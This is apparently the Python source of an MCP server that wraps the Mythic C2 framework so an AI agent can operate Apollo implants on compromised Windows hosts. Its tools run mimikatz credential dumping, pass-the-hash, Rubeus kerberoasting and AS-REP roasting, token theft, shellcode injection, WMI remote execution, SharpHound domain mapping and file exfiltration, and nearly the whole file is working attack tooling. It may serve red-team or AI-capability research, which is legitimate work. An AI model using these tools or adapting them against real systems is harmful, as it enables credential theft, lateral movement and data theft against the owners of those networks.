#!/usr/bin/env -S uv run
# /// script
# requires-python = ">=3.11"
# dependencies = [
#   "fastmcp>=2.0",
#   "mythic>=0.2",
# ]
# ///
"""Mythic C2 MCP server — wraps the Mythic Python SDK for server and implant interaction.

Env vars:
  MYTHIC_SERVER_IP    (default: 127.0.0.1)
  MYTHIC_SERVER_PORT  (default: 443)
  MYTHIC_USERNAME     (default: mythic_admin)
  MYTHIC_PASSWORD     (required unless provided via connect tool)
  MYTHIC_DATA_DIR     (default: <repo>/data/mythic)
"""

from __future__ import annotations

import os
import tempfile
from pathlib import Path
from typing import Annotated, Any
from uuid import uuid4

from fastmcp import FastMCP
from mythic import mythic as mythic_sdk

mcp = FastMCP("mythic")

MAX_OUTPUT_CHARS = 1_048_576  # 1 MB

MYTHIC_DATA_DIR = os.environ.get(
    "MYTHIC_DATA_DIR",
    str(Path(__file__).parent.parent / "data" / "mythic"),
)

# ── Connection state ─────────────────────────────────────────────────

_client: Any | None = None
_config: dict[str, Any] = {}


def _default_config() -> dict[str, Any]:
    return {
        "server_ip": os.environ.get("MYTHIC_SERVER_IP", "127.0.0.1"),
        "server_port": int(os.environ.get("MYTHIC_SERVER_PORT", "443")),
        "username": os.environ.get("MYTHIC_USERNAME", "mythic_admin"),
        "password": os.environ.get("MYTHIC_PASSWORD", ""),
        "timeout": int(os.environ.get("MYTHIC_TIMEOUT", "-1")),
    }


async def _get_client() -> Any:
    global _client, _config
    if _client is not None:
        return _client
    if not _config:
        _config = _default_config()
    if not _config["password"]:
        raise RuntimeError(
            "Not connected. Call connect(password=...) or set MYTHIC_PASSWORD env var."
        )
    _client = await mythic_sdk.login(
        username=_config["username"],
        password=_config["password"],
        server_ip=_config["server_ip"],
        server_port=_config["server_port"],
        timeout=_config["timeout"],
    )
    return _client


def _truncate(text: str) -> str:
    if len(text) <= MAX_OUTPUT_CHARS:
        return text
    half = MAX_OUTPUT_CHARS // 2
    return text[:half] + "\n...[truncated]...\n" + text[-half:]


# ── Private execute helper (NOT an MCP tool) ─────────────────────────


async def _execute(
    callback_id: int,
    command: str,
    args: dict[str, Any] | str,
    timeout: int | None = None,
) -> str:
    """Execute a command on a Mythic Apollo implant. Core helper used by all implant tools."""
    client = await _get_client()
    cfg = _config or _default_config()
    t = timeout if timeout is not None else cfg["timeout"]
    try:
        output_bytes = await mythic_sdk.issue_task_and_waitfor_task_output(
            mythic=client,
            command_name=command,
            parameters=args,
            callback_display_id=callback_id,
            timeout=t,
        )
    except Exception as e:
        return (
            f"An unexpected error occurred when trying to execute previous command. "
            f"The error is:\n\n{e}.\n. Sometimes the command just needs to be "
            f"re-executed, however if already tried to re-execute the command, best to move on to another."
        )

    if not output_bytes:
        return f"Command '{command}' returned no output."

    text = str(output_bytes.decode() if isinstance(output_bytes, bytes) else output_bytes)
    text = _truncate(text)

    if command == "execute_assembly" and "is not loaded (have you registered it?" in text:
        return f"{text}\n\nTry using 'register_assembly' tool to first register the assembly and then try executing again."

    return text


# ── Generic execute (for Apollo commands without a dedicated tool) ────


@mcp.tool
async def execute(
    callback_id: Annotated[int, "Apollo callback display ID"],
    command: Annotated[str, "Apollo command name (e.g. shell, dcsync, socks, link, ppid, blockdlls, inject, screenshot)"],
    arguments: Annotated[str | dict, "Command arguments (string or dict depending on command)"] = "",
    timeout: Annotated[int | None, "Command timeout in seconds"] = None,
) -> str:
    """Execute any Apollo command by name. Use this for commands that don't have a dedicated tool (e.g. shell, dcsync, socks, link, ppid, blockdlls). For commands with dedicated tools, prefer those instead."""
    return await _execute(callback_id, command, arguments, timeout)


# ── Connection tools ─────────────────────────────────────────────────


@mcp.tool
async def connect(
    server_ip: Annotated[str | None, "Mythic server IP"] = None,
    server_port: Annotated[int | None, "Mythic server port"] = None,
    username: Annotated[str | None, "Mythic username"] = None,
    password: Annotated[str | None, "Mythic password"] = None,
) -> str:
    """Connect to a Mythic C2 server. Overrides env var defaults for this session."""
    global _client, _config
    _client = None
    _config = _default_config()
    if server_ip:
        _config["server_ip"] = server_ip
    if server_port:
        _config["server_port"] = server_port
    if username:
        _config["username"] = username
    if password:
        _config["password"] = password
    client = await _get_client()
    return f"Connected to Mythic at {_config['server_ip']}:{_config['server_port']} as {_config['username']}"


# ── Server tools ─────────────────────────────────────────────────────


@mcp.tool
async def get_callbacks() -> list[dict]:
    """List all active Mythic callbacks (implant connections), sorted by most recent check-in."""
    client = await _get_client()
    cbs = await mythic_sdk.get_all_active_callbacks(
        client,
        "display_id,id,host,user,domain,integrity_level,ip,process_name,pid,"
        "payload{os,payloadtype{name},description},last_checkin",
    )
    return sorted(cbs, key=lambda x: x["last_checkin"], reverse=True)


@mcp.tool
async def upload_file(
    filepath: Annotated[str, "Local file path to upload to the Mythic server"],
    reupload: Annotated[bool, "Re-upload if file already exists on server"] = True,
) -> dict | str:
    """Upload a local file to the Mythic server for use with callbacks."""
    client = await _get_client()
    filename = Path(filepath).name
    if not reupload:
        existing = await check_file(filename=filename)
        if isinstance(existing, dict):
            return {"filename": filename, "file_id": existing["agent_file_id"]}
    contents = Path(filepath).read_text()
    file_id = await mythic_sdk.register_file(
        mythic=client, filename=filename, contents=contents.encode("utf-8")
    )
    return {"filename": filename, "file_id": file_id}


@mcp.tool
async def check_file(
    filename: Annotated[str, "Filename to check on the Mythic server"],
) -> dict | str:
    """Check if a file exists on the Mythic server."""
    client = await _get_client()
    attrs = "agent_file_id,filename_utf8,timestamp,deleted,is_download_from_agent,sha1,md5,complete"
    async for batch in mythic_sdk.get_all_uploaded_files(
        mythic=client, custom_return_attributes=attrs, batch_size=50
    ):
        for record in batch:
            if record["filename_utf8"] == filename and not record["deleted"]:
                return record
    return f"File '{filename}' not found on server."


@mcp.tool
async def download_file(
    filename: Annotated[str, "Name of the file to download from the Mythic server"],
) -> str:
    """Download a file from the Mythic server's downloaded files."""
    client = await _get_client()
    file_uuid = None
    async for batch in mythic_sdk.get_all_downloaded_files(
        mythic=client,
        custom_return_attributes="agent_file_id,filename_utf8,is_download_from_agent",
        batch_size=50,
    ):
        for f in batch:
            if f["filename_utf8"] == filename:
                file_uuid = f["agent_file_id"]
                break
        if file_uuid:
            break
    if file_uuid is None:
        return f"File '{filename}' not found on server."
    data = await mythic_sdk.download_file(mythic=client, file_uuid=file_uuid)
    return f"Downloaded '{filename}' ({len(data) / 1024:.1f} KB)"


# ── Apollo implant tools ─────────────────────────────────────────────


@mcp.tool
async def adcollector(
    callback_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """Enumerates the current Active Directory domain environment. It will give you a basic understanding of the configuration/deployment of the active directory environment. The tool will potentially produce a lot of information about the domain. Parse the output carefully for useful information."""
    return await _execute(callback_id, command="execute_assembly", args="ADCollector.exe")


@mcp.tool
async def adsearch(
    callback_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """Queries the active directory for domain objects (i.e. users, computers, groups)."""
    return await _execute(callback_id, command="execute_assembly", args="ADSearch.exe")


@mcp.tool
async def cat(
    callback_id: Annotated[int, "Apollo callback display ID"],
    path: Annotated[str, "The path of the file to read."],
) -> str:
    """Read the contents of a file at the specified path."""
    return await _execute(callback_id, command="cat", args=path)


@mcp.tool
async def cd(
    callback_id: Annotated[int, "Apollo callback display ID"],
    path: Annotated[str, "The path to change into."],
) -> str:
    """Change directory to path. Path relative identifiers such as ../ are accepted. The path can be absolute or relative. If the path is relative, it will be resolved against the current working directory of the agent."""
    return await _execute(callback_id, command="cd", args=path)


@mcp.tool
async def cp(
    callback_id: Annotated[int, "Apollo callback display ID"],
    source: Annotated[str, "The path to the source file on the target system to copy."],
    destination: Annotated[str, "The destination path on the target system to copy the file to."],
) -> str:
    """Copy a file from the source path to the destination path on the target system. The source and destination paths can be absolute or relative. If the paths are relative, they will be resolved against the current working directory of the agent."""
    return await _execute(callback_id, command="cp", args={"source": source, "destination": destination})


@mcp.tool
async def download(
    callback_id: Annotated[int, "Apollo callback display ID"],
    path: Annotated[str, "The full path of the file on the target system to download."],
) -> str:
    """Download a file from the target system to the C2 server. The file will be saved with the specified filename on the C2 server."""
    return await _execute(callback_id, command="download", args=path)


@mcp.tool
async def download_to_local_file(
    callback_id: Annotated[int, "Apollo callback display ID"],
    path: Annotated[str, "The full path of the file on the target system to download."],
) -> str | dict:
    """Download a file from a target callback host to a local file. The file will first be downloaded from the target callback host to the Mythic C2 server, then from the Mythic C2 server to a local file."""
    # 1. initiate file download from callback host to Mythic server
    download_result = await download(callback_id=callback_id, path=path)
    if "does not exist." in download_result:
        return f"Error running 'download_to_local_file' command.\n\n Command response:\n{download_result}"

    # 2. download file from Mythic server (look up file UUID by name first)
    client = await _get_client()
    file_uuid = None
    async for batch in mythic_sdk.get_all_downloaded_files(
        mythic=client,
        custom_return_attributes="agent_file_id,filename_utf8,is_download_from_agent",
        batch_size=50,
    ):
        for f in batch:
            if f["filename_utf8"] == path:
                file_uuid = f["agent_file_id"]
                break
        if file_uuid:
            break
    if file_uuid is None:
        return f"File '{path}' could not be downloaded from Mythic server to local file system. Is the filename correct?"
    fbytes = await mythic_sdk.download_file(mythic=client, file_uuid=file_uuid)
    if fbytes is None:
        return f"File '{path}' could not be downloaded from Mythic server to local file system. Is the filename correct?"

    # 3. write file to local system
    filename = Path(path).name
    if "\\" in path:
        filename = path.split("\\")[-1]
    tmp_dir = tempfile.mkdtemp()
    tmp_path = os.path.join(tmp_dir, filename)
    with open(tmp_path, "wb") as f:
        f.write(fbytes)

    return {"name": filename, "path": tmp_path}


@mcp.tool
async def getprivs(
    callback_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """Attempt to enable all possible privileges for the agent's current access token. This may include privileges like SeDebugPrivilege, SeImpersonatePrivilege, etc."""
    return await _execute(callback_id, command="getprivs", args="")


@mcp.tool
async def ifconfig(
    callback_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """List the network interfaces and their configuration details on the target system. This includes IP addresses, subnet masks, and other relevant information."""
    return await _execute(callback_id, command="ifconfig", args="")


@mcp.tool
async def jobkill(
    callback_id: Annotated[int, "Apollo callback display ID"],
    jid: Annotated[int, "The job identifier of the background job to terminate."],
) -> str:
    """Terminate a background job with the specified job identifier (jid). This will stop the job from running and free up any resources it was using."""
    return await _execute(callback_id, command="jobkill", args=str(jid))


@mcp.tool
async def jobs(
    callback_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """List all currently active background jobs being managed by the agent. This includes jobs that are running, completed, or failed."""
    return await _execute(callback_id, command="jobs", args="")


@mcp.tool
async def ls(
    callback_id: Annotated[int, "Apollo callback display ID"],
    path: Annotated[
        str | None,
        "The path of the directory to list. Defaults to the current working directory.",
    ] = None,
) -> str:
    """List files and folders in a specified directory."""
    args: dict[str, str] | str = "" if not path or "null" in path.lower() else {"path": path}
    return await _execute(callback_id, command="ls", args=args)


@mcp.tool
async def make_token(
    callback_id: Annotated[int, "Apollo callback display ID"],
    username: Annotated[str, "The username to use for the new logon session."],
    password: Annotated[str, "The password for the specified username."],
    netonly: Annotated[
        bool,
        "If true, the token will be created for network access only. If false, the token will be created for interactive access.",
    ] = False,
) -> str:
    """Create a new logon session using the specified [username] and [password]. The token can be created for network access only or interactive access based on the [netonly] parameter."""
    return await _execute(
        callback_id,
        command="make_token",
        args={"username": username, "password": password, "netOnly": str(netonly)},
    )


@mcp.tool
async def mimikatz(
    callback_id: Annotated[int, "Apollo callback display ID"],
    commands: Annotated[
        str, "A list of Mimikatz commands to execute. Separate commands by a space."
    ],
) -> str:
    """Execute one or more mimikatz commands using its reflective library.

    Example commands:
        sekurlsa::logonpasswords
        sekurlsa::tickets
        token::list
        lsadump::sam
        sekurlsa::wdigest
        vault::cred
        vault::list
        sekurlsa::dpapi
    """
    return await _execute(callback_id, command="mimikatz", args=commands)


@mcp.tool
async def net_dclist(
    callback_id: Annotated[int, "Apollo callback display ID"],
    domain: Annotated[
        str | None,
        "The target domain for which to enumerate Domain Controllers. Defaults to the current domain if omitted.",
    ] = "",
) -> str:
    """Get domain controllers belonging to domain."""
    if not domain or "null" in domain.lower():
        return "Argument error, must supply domain."
    return await _execute(callback_id, command="net_dclist", args=domain)


@mcp.tool
async def net_localgroup(
    callback_id: Annotated[int, "Apollo callback display ID"],
    computer: Annotated[
        str,
        "Command line arguments for the 'net_localgroup' command. Defaults to the local machine (localhost) if omitted.",
    ] = "localhost",
) -> str:
    """List the local groups on the specified computer. If no computer is specified, the local machine will be used."""
    return await _execute(
        callback_id,
        command="net_localgroup",
        args=computer if computer is not None else "localhost",
    )


@mcp.tool
async def net_localgroup_member(
    callback_id: Annotated[int, "Apollo callback display ID"],
    group: Annotated[str, "target group to list group members"],
    computer: Annotated[str, "target computer to list group members"] = "localhost",
) -> str:
    """List the members of a specific local group on the specified computer. If no computer is specified, the local machine will be used."""
    return await _execute(
        callback_id,
        command="net_localgroup_member",
        args={"computer": computer, "group": group},
    )


@mcp.tool
async def net_shares(
    callback_id: Annotated[int, "Apollo callback display ID"],
    computer: Annotated[
        str,
        "The hostname or IP address of the target computer. Defaults to the local machine (localhost) if omitted.",
    ] = "localhost",
) -> str:
    """List network shares available on the specified [computer]. If no computer is specified, the local machine will be used."""
    return await _execute(callback_id, command="net_shares", args=computer)


@mcp.tool
async def netstat(
    callback_id: Annotated[int, "Apollo callback display ID"],
    listen: Annotated[bool, "list ports in listening state"] = True,
    established: Annotated[bool, "list ports in established state"] = True,
    tcp: Annotated[bool, "list ports using TCP"] = True,
    udp: Annotated[bool, "list ports using UDP"] = True,
) -> str:
    """Display active TCP/UDP connections and listening ports on the target system. This includes information about the local and remote addresses, port numbers, and connection states."""
    return await _execute(
        callback_id,
        command="netstat",
        args={
            "listen": str(listen).lower(),
            "established": str(established).lower(),
            "tcp": str(tcp).lower(),
            "udp": str(udp).lower(),
        },
    )


@mcp.tool
async def powerpick(
    callback_id: Annotated[int, "Apollo callback display ID"],
    arguments: Annotated[
        str,
        "The PowerShell command or script block to execute. This can be a single command or a script block enclosed in curly braces.",
    ],
) -> str:
    """Injects a PowerShell loader into a sacrificial process and executes the provided PowerShell command. This allows for executing PowerShell commands or scripts in the context of the agent's current security token."""
    return await _execute(callback_id, command="powerpick", args=arguments)


@mcp.tool
async def powershell(
    callback_id: Annotated[int, "Apollo callback display ID"],
    arguments: Annotated[
        str,
        "Powershell command line arguments to supply to the powershell instance and execute.",
    ],
    timeout: Annotated[
        int, "time duration, in seconds, to wait for powershell command to return"
    ] = 30,
) -> str:
    """Executes Powershell with the supplied command line arguments in current Powershell instance."""
    return await _execute(callback_id, command="powershell", args=arguments, timeout=timeout)


@mcp.tool
async def powershell_import(
    callback_id: Annotated[int, "Apollo callback display ID"],
    filename: Annotated[
        str,
        ".ps1 file to be registered within Apollo agent and made available to PowerShell jobs",
    ],
) -> str:
    """Register a new powershell .ps1 file in the Apollo agent and allow for powershell script to be available for PowerShell jobs. This is not Powershell's Import-Module command but Apollo's native powershell import command. The file must exist on the Mythic C2 server. If file is not present, it can be uploaded with the upload tool."""
    return await _execute(
        callback_id,
        command="powershell_import",
        args={"existingFile": filename},
        timeout=60,
    )


@mcp.tool
async def powershell_script(
    callback_id: Annotated[int, "Apollo callback display ID"],
    entry_function: Annotated[
        str,
        "Name of the Powershell entry function to call to start execution of the script.",
    ],
    filepath: Annotated[
        str | None,
        "File path of powershell script. 'filepath' or 'script' must be supplied.",
    ] = None,
    script: Annotated[
        str | None,
        "Powershell script. Encoded as a raw string. 'filepath' or 'script' must be supplied.",
    ] = None,
    args: Annotated[str, "(Optional) Arguments to supply the entry function."] = "",
    reupload: Annotated[
        bool,
        "Whether to re-upload the powershell script to the Mythic server (which is done before downloading and executing script on the target host), if the script file already exists on the server (from previous uploading).",
    ] = True,
) -> str:
    """Executes the supplied powershell script on a target host. Supply the powershell script as a string. The powershell script must be composed of powershell functions where one of these functions will be the entry function that will be called to start the script."""
    if not any([filepath, script]):
        return "Error: Either 'filepath' or 'script' argument must be provided."

    if script is not None:
        # 1. If script string provided, write to local temp file
        filename = f"pwsh_script_{str(uuid4())[:8]}.ps1"
        tmp_dir = tempfile.mkdtemp()
        tmp_path = os.path.join(tmp_dir, filename)
        with open(tmp_path, "w") as f:
            f.write(script)
        filepath = tmp_path
    else:
        if filepath is None:
            return "Error: filepath must be provided when script is None."
        filename = filepath.split("/")[-1]

    # 2. upload powershell script file to Mythic server
    upload_result = await upload_file(filepath=filepath, reupload=reupload)

    if script is not None:
        # cleanup temp file
        try:
            os.unlink(filepath)
        except OSError:
            pass

    if not isinstance(upload_result, dict) or upload_result.get("file_id") is None:
        return "Error running 'powershell_script' command.\n\n Attempting to upload powershell script file to Mythic led to unknown error."

    # 3. powershell import the script file from Mythic server to the target callback/implant
    pi_result = await powershell_import(callback_id=callback_id, filename=filename)

    if "will now be imported in PowerShell commands" not in pi_result:
        return f"Error running 'powershell_import' Mythic command for Apollo agent (as precursor to executing powershell script). Error response: {pi_result}"

    # 4. run the powershell script on the target callback/implant
    return await powershell(callback_id=callback_id, arguments=f"{entry_function} {args}")


@mcp.tool
async def powerview(
    callback_id: Annotated[int, "Apollo callback display ID"],
    command: Annotated[
        str,
        "Powerview command line arguments to supply to the powershell instance and execute.",
    ],
    credential_user: Annotated[
        str | None, "(Optional) username to execute Powerview commands as specified user"
    ] = None,
    credential_password: Annotated[
        str | None, "(Optional) password to execute Powerview commands as specified user"
    ] = None,
    domain: Annotated[
        str | None, "(Optional) domain to execute Powerview commands as specified user"
    ] = None,
) -> str:
    """Imports PowerView into Powershell (for use) and then executes the supplied command line arguments in current Powershell instance."""
    # 1. check if powerview on Mythic server, upload if not there
    powerview_script_filename = "PowerView.ps1"
    upload_result = await upload_file(
        filepath=os.path.join(MYTHIC_DATA_DIR, powerview_script_filename),
        reupload=False,
    )
    if not isinstance(upload_result, dict) or upload_result.get("file_id") is None:
        return f"Error running 'powerview' command.\n\n Attempting to upload {powerview_script_filename} file to Mythic led to unknown error."

    # 2. import powerview into Mythic beacon
    pi_result = await powershell_import(callback_id=callback_id, filename=upload_result["filename"])
    if "will now be imported in PowerShell commands" not in pi_result:
        return f"Error running [COMMAND] 'powershell_import': - {pi_result}."

    # 3. if command has credential user, add credential flag with powershell credential grab to Powerview command args
    powerview_cmd = command
    if all([credential_user, credential_password, domain]):
        powerview_cmd = (
            f"{powerview_cmd} -Credential (New-Object -TypeName "
            f"'System.Management.Automation.PSCredential' -ArgumentList "
            f"'{domain}\\{credential_user}', (ConvertTo-SecureString -String "
            f"'{credential_password}' -AsPlainText -Force))"
        )

    # 4. run powerview (through powershell)
    return await powershell(callback_id=callback_id, arguments=powerview_cmd)


@mcp.tool
async def pth(
    callback_id: Annotated[int, "Apollo callback display ID"],
    domain: Annotated[str, "The target domain for which to perform the Pass-the-Hash operation."],
    username: Annotated[str, "The username to authenticate as."],
    ntlm_hash: Annotated[
        str,
        "The NTLM hash of the user's password. This is used instead of the plaintext password.",
    ],
) -> str:
    """Authenticate to a remote system using a Pass-the-Hash technique with the specified domain, username, and password_hash. This allows for authentication without needing the plaintext password."""
    return await _execute(
        callback_id,
        command="pth",
        args={"domain": domain, "user": username, "ntlm": ntlm_hash},
    )


@mcp.tool
async def ps(
    callback_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """List running processes on the target system, typically including PID, name, architecture, and user context."""
    return await _execute(callback_id, command="ps", args="")


@mcp.tool
async def pwd(
    callback_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """Print the agent's current working directory on the target system. This is the directory where the agent is currently operating."""
    return await _execute(callback_id, command="pwd", args="")


@mcp.tool
async def reg_query(
    callback_id: Annotated[int, "Apollo callback display ID"],
    key: Annotated[
        str,
        "The full path of the registry key to query (e.g., 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion').",
    ],
) -> str:
    """Query the values and subkeys under a specified registry [key]. This allows for retrieving information from the Windows registry."""
    return await _execute(callback_id, command="reg_query", args=key)


@mcp.tool
async def register_assembly(
    callback_id: Annotated[int, "Apollo callback display ID"],
    filename: Annotated[str, "Assembly file to register to the Apollo agent"],
) -> str:
    """Registers (loads) assembly files/commands to a Mythic agent."""
    return await _execute(
        callback_id,
        command="register_assembly",
        args={"existingFile": filename},
    )


@mcp.tool
async def rev2self(
    callback_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """Revert the agent's impersonation state, returning to its original primary token. This is useful for restoring the agent's original security context after performing actions with a different token."""
    return await _execute(callback_id, command="rev2self", args="")


@mcp.tool
async def rubeus_asreproast(
    callback_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """Execute ASREP-Roast technique against current domain using the Rubeus tool. The technique extracts kerberos ticket-granting tickets for active directory users that dont require pre-authentication on the domain. If ticket-granting tickets can be obtained, they will be returned (in hash form)."""
    return await _execute(
        callback_id,
        command="execute_assembly",
        args="Rubeus.exe asreproast /format:hashcat",
    )


@mcp.tool
async def rubeus_kerberoast(
    callback_id: Annotated[int, "Apollo callback display ID"],
    cred_user: Annotated[
        str,
        "principal domain user to execute the command under, formatted in fqdn format: 'domain\\user'",
    ],
    cred_password: Annotated[str, "principal domain user password"],
    user: Annotated[
        str | None, "(optional) specific domain user to target for kerberoasting"
    ] = None,
    spn: Annotated[str | None, "(optional) specific SPN to target for kerberoasting"] = None,
) -> str:
    """Execute kerberoasting technique against current domain using the Rubeus tool. The tool extracts kerberos ticket-granting tickets for active directory users that have service principal names (SPNs) set. To use 'rubeus_kerberoast' tool, you must have a username and password of existing user on the active directory domain. If ticket-granting tickets for the SPN accounts can be obtained, they will be returned (in a hash format)."""
    args = f"Rubeus.exe kerberoast /creduser:{cred_user} /credpassword:{cred_password} /format:hashcat"
    if user is not None:
        args += f" /user:{user}"
    if spn is not None:
        args += f" /spn:{spn}"
    return await _execute(callback_id, command="execute_assembly", args=args)


@mcp.tool
async def seatbelt(
    callback_id: Annotated[int, "Apollo callback display ID"],
    group: Annotated[str, "Group flag. Options: 'all', 'system'."] = "all",
) -> str:
    """Performs a number of security oriented host-survey 'safety checks' relevant from both offensive and defensive security perspectives."""
    return await _execute(
        callback_id,
        command="execute_assembly",
        args=f'Seatbelt.exe "-group={group}"',
    )


@mcp.tool
async def set_injection_technique(
    callback_id: Annotated[int, "Apollo callback display ID"],
    technique: Annotated[
        str,
        "The name of the process injection technique to use for subsequent injection commands (e.g., 'CreateRemoteThread', 'MapViewOfSection'). Must be a technique supported by the agent (see `get_injection_techniques`).",
    ],
) -> str:
    """Set the default process injection technique used by commands like `assembly_inject`, `execute_assembly`, etc. This allows for specifying the method of injecting code into a target process."""
    return await _execute(callback_id, command="set_injection_technique", args=technique)


@mcp.tool
async def setspn(
    callback_id: Annotated[int, "Apollo callback display ID"],
    args: Annotated[str, "command line arguments for setspn tool"],
) -> str:
    """Allows for reading, modifying, and deleting the Service Principal Names (SPN) directory property for an Active Directory (AD) account. You can use setspn to view the current SPNs for an account, reset the account's default SPNs, and add or delete supplemental SPNs."""
    return await _execute(
        callback_id,
        command="powershell",
        args=f"($sspn = setspn {args}); echo $sspn",
    )


@mcp.tool
async def sharphound_and_download(
    callback_id: Annotated[int, "Apollo callback display ID"],
    domain: Annotated[str, "domain to enumerate."],
    ldap_username: Annotated[
        str | None, " (Optional) LDAP username to use for Sharphound."
    ] = None,
    ldap_password: Annotated[
        str | None, "(Optional) LDAP password to use for Sharphound."
    ] = None,
    local_filename: Annotated[
        str | None,
        "(Optional) Filename to save the local file as, a unique name will be created if none is supplied.",
    ] = None,
) -> str | dict:
    """Run sharphound on the target callback to collect Bloodhound data. Then download the Bloodhound results file to a local file. "local" being wherever the agent is running."""
    # 1. Upload SharpHound v.2.6.7 to Mythic Server
    upload_result = await upload_file(
        filepath=os.path.join(MYTHIC_DATA_DIR, "sharphound-v2.6.7", "SharpHound.ps1"),
        reupload=False,
    )
    if not isinstance(upload_result, dict) or upload_result.get("file_id") is None:
        return "Error running command 'sharphound_and_download'.\n\n Attempting to upload powershell script file to Mythic led to unknown error."

    # 2. powershell import the script file from Mythic server to the target callback/implant
    pi_result = await powershell_import(callback_id=callback_id, filename=upload_result["filename"])
    if "will now be imported in PowerShell commands" not in pi_result:
        return f"Error running 'sharphound_and_download': {pi_result}"

    # 3. run the powershell command for running Sharphound on the target callback/implant
    zip_filename_marker = f"{uuid4()!s}.zip"
    sharp_cmd = f"Invoke-BloodHound -Zipfilename {zip_filename_marker} -Domain {domain}"
    if all([ldap_username, ldap_password]):
        sharp_cmd += f" --ldapusername {ldap_username} --ldappassword {ldap_password}"

    sharphound_result = await powershell(callback_id=callback_id, arguments=sharp_cmd, timeout=120)

    if "SharpHound Enumeration Completed" not in sharphound_result:
        return f"Error running 'sharphound_and_download'.\n\n Command response:\n{sharphound_result}"

    # 4. Find the sharphound results file (SharpHound prefixes with timestamp)
    sharp_results_fn = await powershell(
        callback_id=callback_id,
        arguments=f"(Get-ChildItem -Path .\\ -Filter '*{zip_filename_marker}').name",
    )

    if zip_filename_marker not in sharp_results_fn:
        return f"Error running 'sharphound_and_download'.\n\n Command response:\n{sharp_results_fn}"

    # parse filename from output, comes back from Apollo with extra chars
    sharp_results_fn = sharp_results_fn.strip("\r\n").split("\r\n")[-1]

    # 5. Download Sharphound collection data to local file
    local_download_file = await download_to_local_file(callback_id=callback_id, path=sharp_results_fn)

    if not isinstance(local_download_file, dict):
        return f"Error running 'sharphound_and_download'.\n\n Command response:\n{local_download_file}"

    # 6. Rename local file if a specific filename was requested
    if local_filename:
        os.rename(local_download_file["path"], local_filename)
        local_download_file["path"] = os.path.abspath(local_filename)
        local_download_file["name"] = os.path.basename(local_download_file["path"])

    return local_download_file


@mcp.tool
async def shinject(
    callback_id: Annotated[int, "Apollo callback display ID"],
    pid: Annotated[int, "Target process PID."],
    shellcode_filepath: Annotated[str, "Local shell code file."],
) -> str:
    """Inject raw shellcode into a remote process. This allows for executing arbitrary code in the context of another process."""
    # need to first upload shellcode file to Mythic server
    upload_result = await upload_file(filepath=shellcode_filepath, reupload=True)

    if not isinstance(upload_result, dict) or upload_result.get("file_id") is None:
        return "Error running 'shinject' command.\n\n Attempting to upload shellcode file to Mythic led to unknown error."

    return await _execute(
        callback_id,
        command="shinject",
        args={"pid": pid, "shellcode_file_id": upload_result["file_id"]},
    )


@mcp.tool
async def spawnto_x64(
    callback_id: Annotated[int, "Apollo callback display ID"],
    application: Annotated[
        str,
        "The full path to the 64-bit executable that the agent should launch for subsequent post-exploitation jobs or spawning new sessions.",
    ],
    args: Annotated[
        str | None,
        "(optional) A list of command-line arguments to launch the [path] executable with.",
    ] = "",
) -> str:
    """Configure the default 64-bit executable [path] (and optional [args]) used for process injection targets and spawning. This allows for specifying the executable that will be used for subsequent post-exploitation jobs or spawning new sessions."""
    return await _execute(
        callback_id,
        command="spawnto_x64",
        args={"application": application, "arguments": args},
    )


@mcp.tool
async def steal_token(
    callback_id: Annotated[int, "Apollo callback display ID"],
    pid: Annotated[
        int,
        "The process ID (PID) from which to steal the primary access token. If omitted, a default process (like winlogon.exe) might be targeted.",
    ],
) -> str:
    """Impersonate the primary access token of another process specified by its pid. This allows for executing commands with the security context of the target process."""
    return await _execute(callback_id, command="steal_token", args=str(pid))


@mcp.tool
async def upload(
    callback_id: Annotated[int, "Apollo callback display ID"],
    filepath: Annotated[str, "file path of local file to upload to host."],
    target_host_path: Annotated[str, "target filepath on target host to place uploaded file"],
) -> str:
    """Upload a local file to target host, through Mythic C2. The file will be saved with the specified filename on the target system."""
    upload_status = await upload_file(filepath=filepath, reupload=True)
    if not isinstance(upload_status, dict) or upload_status.get("file_id") is None:
        return f"File could not be uploaded to Mythic server: '{filepath}'"

    return await _execute(
        callback_id,
        command="upload",
        args={"remote_path": target_host_path, "file": upload_status["file_id"]},
    )


@mcp.tool
async def whoami(
    callback_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """Display the username associated with the agent's current security context (impersonated token or primary token). This includes information about the user and their privileges."""
    return await _execute(callback_id, command="whoami", args="")


@mcp.tool
async def wmiexecute(
    callback_id: Annotated[int, "Apollo callback display ID"],
    command: Annotated[str, "the full path and arguments of the process to execute"],
    host: Annotated[str, "computer to execute the command on. If empty, the current computer"],
    username: Annotated[str, "username of the account to execute the wmi process as"],
    password: Annotated[str, "plaintext password of the account"],
    domain: Annotated[str, "domain name for the account"],
) -> str:
    """Execute a command on a remote system using WMI (Windows Management Instrumentation). This allows for executing commands remotely without needing to establish a direct connection."""
    return await _execute(
        callback_id,
        command="wmiexecute",
        args={
            "command": command,
            "host": host,
            "username": username,
            "password": password,
            "domain": domain,
        },
    )


if __name__ == "__main__":
    mcp.run(transport="stdio")
